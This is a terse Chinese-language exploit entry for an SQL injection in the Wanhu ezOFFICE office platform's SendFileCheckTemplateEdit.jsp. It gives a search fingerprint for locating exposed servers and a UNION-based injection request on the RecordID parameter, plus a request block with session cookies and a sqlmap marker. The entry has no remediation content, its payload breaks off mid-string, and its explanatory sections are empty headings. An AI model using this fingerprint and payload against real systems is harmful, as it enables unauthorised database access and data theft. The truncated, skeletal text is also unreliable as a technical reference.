# 万户协同办公平台ezofficeSendFileCheckTemplateEdit存在SQL注入漏洞

- **系统**：万户协同办公平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="万户 Ezoffice OA"`
- **请求**：`GET /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp;xc?RecordID=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28117%29%2BCHAR%2877%29%2BCHAR%2899%29%2BCHAR%2886%29%2BCHAR%2873%29%2BCHAR%2865%29%2BCHA`

**请求体 / payload**
```
/defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp;xc?RecordID=1
Host:
Cookie: OASESSIONID=4E2455852565283AF1C96D72A82F0039; OASESSIONID=8CEBEFC17B098632FAECBAAFCFB50CE0; LocLan=zh_CN
qkzqquMcVIABuaCzqEInJrNBkSgCWIVJADyZCxcNyDnVzqvzkq
sqlmap
/defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp;xc?RecordID=1
```

**其他**
- 万户协同办公平台ezoffice SendFileCheckTemplateEdit 存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 万户ezoffice